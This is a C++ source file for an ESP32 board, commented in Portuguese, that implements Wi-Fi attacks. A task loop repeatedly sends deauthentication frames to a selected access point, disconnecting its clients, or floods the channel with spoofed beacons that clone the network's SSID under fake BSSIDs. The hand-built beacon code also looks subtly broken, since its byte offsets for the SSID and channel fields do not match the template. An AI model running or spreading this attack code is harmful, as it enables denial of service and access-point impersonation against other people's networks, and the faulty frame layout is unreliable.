#include "Attacks.h"
#include "Globals.h"
#include "esp_wifi.h"

extern "C" {
  #include "wsl_bypasser.h"
}

// Beacon frame deve ser 0x80 (Beacon), não 0x80,0x00
const uint8_t beacon_template[] = {
  0x80, 0x00,                         // Frame Control (Beacon frame)
  0x00, 0x00,                         // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (broadcast)
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source (será substituído)
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (será substituído)
  0x00, 0x00,                         // Sequence Control
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
  0x64, 0x00,                         // Beacon interval (100ms)
  0x31, 0x04,                         // Capability info
  // SSID IE
  0x00,                               // IE ID (0x00 = SSID)
  0x00,                               // SSID length (será substituído)
  // SSID vai aqui
  0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24, // Supported rates
  0x03, 0x01, 0x01,                   // DS Parameter set (canal 1)
  0x05, 0x04, 0x01, 0x02, 0x00, 0x00  // Traffic Indication Map
};

void sendBeacon(const char* ssid, uint8_t* bssid, uint8_t channel, uint8_t seq_num) {
  uint8_t packet[256];
  int ssid_len = strlen(ssid);
  if (ssid_len > 32) ssid_len = 32;
  
  // Copiar template
  memcpy(packet, beacon_template, sizeof(beacon_template));
  
  // Atualizar SSID length e copiar SSID
  int ssid_ie_position = 38; // Posição onde começa o IE SSID no template
  packet[ssid_ie_position + 1] = ssid_len;
  memcpy(&packet[ssid_ie_position + 2], ssid, ssid_len);
  
  // Atualizar BSSID e Source
  memcpy(&packet[10], bssid, 6);  // Source
  memcpy(&packet[16], bssid, 6);  // BSSID
  
  // Atualizar canal
  // Posição do DS Parameter set (IE ID 0x03) após o SSID
  // 38 (cabeçalho) + 2 (SSID IE header) + ssid_len + 10 (rates) = 50 + ssid_len
  int ds_param_position = ssid_ie_position + 2 + ssid_len + 10 + 2; // +2 para o IE ID/Len
  if (ds_param_position + 1 < 256) {
    packet[ds_param_position] = channel; // Canal no DS Parameter set
  }
  
  // Atualizar número de sequência (apenas 4 bits mais baixos)
  packet[22] = (seq_num << 4) & 0xF0;
  packet[23] = (packet[23] & 0x0F) | ((seq_num & 0xF0) >> 4);
  
  // Calcular tamanho total
  int total_size = 38 + ssid_len + 19; // Cabeçalho + SSID + elementos fixos
  
  // Enviar frame
  esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, packet, total_size, false);
  if (result != ESP_OK) {
    Serial.printf("Erro ao enviar beacon: %d\n", result);
  }
}

void attackTask(void* parameter) {
  Serial.println("[ATTACK_TASK] Iniciada no Core 1");
  
  uint8_t beacon_seq = 0;
  
  while (attackTaskRunning) {
    
    // DEAUTHER
    if (deautherAtivo && radioLocked) {
      if (xSemaphoreTake(wifiMutex, pdMS_TO_TICKS(50))) {
        
        // Verificar canal
        uint8_t canal_atual;
        wifi_second_chan_t segundo;
        esp_wifi_get_channel(&canal_atual, &segundo);
        
        if (canal_atual != canalTravado) {
          esp_err_t err = esp_wifi_set_channel(canalTravado, WIFI_SECOND_CHAN_NONE);
          if (err != ESP_OK) {
            Serial.printf("Erro ao mudar canal: %d\n", err);
          }
        }
        
        // Usar a função do wsl_bypasser
        wsl_bypasser_send_deauth_frame(&apRecordSelecionado);
        deauthCounter++;
        
        xSemaphoreGive(wifiMutex);
        
        vTaskDelay(pdMS_TO_TICKS(deauthTipo == 0 ? 200 : 100));
      }
    }
    
    // BEACON SPAM
    else if (beaconAtivo && radioLocked) {
      if (xSemaphoreTake(wifiMutex, pdMS_TO_TICKS(50))) {
        
        // Verificar canal primeiro
        uint8_t canal_atual;
        wifi_second_chan_t segundo;
        esp_wifi_get_channel(&canal_atual, &segundo);
        
        if (canal_atual != canalTravado) {
          esp_wifi_set_channel(canalTravado, WIFI_SECOND_CHAN_NONE);
        }
        
        // Gerar BSSID aleatório baseado no BSSID original
        uint8_t fake_bssid[6];
        memcpy(fake_bssid, apRecordSelecionado.bssid, 6);
        
        // Modificar os últimos bytes para criar clones
        static uint8_t last_byte = 0;
        fake_bssid[5] = last_byte++;
        
        // Enviar alguns beacons
        for (int i = 0; i < min(5, beaconQuantidade); i++) {
          sendBeacon(ssidSelecionado.c_str(), fake_bssid, 
                    apRecordSelecionado.primary, beacon_seq++);
          beaconCounter++;
          
          // Modificar BSSID para próximo clone
          fake_bssid[5]++;
          
          vTaskDelay(pdMS_TO_TICKS(10));
        }
        
        xSemaphoreGive(wifiMutex);
        vTaskDelay(pdMS_TO_TICKS(100));
      }
    }
    
    vTaskDelay(pdMS_TO_TICKS(10));
  }
  
  Serial.println("[ATTACK_TASK] Finalizando...");
  attackTaskHandle = NULL;
  vTaskDelete(NULL);
}
  

